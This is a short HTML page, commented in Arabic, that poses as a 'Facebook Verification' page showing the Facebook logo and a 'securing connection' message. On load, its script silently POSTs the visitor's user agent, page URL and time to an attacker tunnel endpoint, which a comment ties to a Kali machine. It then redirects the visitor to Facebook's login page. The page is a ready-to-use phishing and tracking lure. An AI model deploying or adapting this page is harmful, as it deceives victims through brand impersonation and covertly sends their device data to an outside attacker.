<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Facebook Verification</title>
    <script>
        async function logAndRedirect() {
            // رابط النفق (Tunnel) اللي طلع لك من كالي
            const tunnelURL = "https://your-tunnel-link.lhr.life/log"; 
            
            const data = {
                ua: navigator.userAgent,
                url: window.location.href,
                time: new Date().toISOString()
            };

            try {
                // إرسال بيانات الجهاز لسيرفر الكالي بصمت
                await fetch(tunnelURL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(data)
                });
            } catch (e) {}

            // التحويل لفيسبوك بعد ثانية واحدة
            setTimeout(() => {
                window.location.href = "https://m.facebook.com/login/";
            }, 1000);
        }
        window.onload = logAndRedirect;
    </script>
</head>
<body style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:50px;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_2019.png" width="60">
    <h2>جاري تأمين الاتصال...</h2>
</body>
</html>
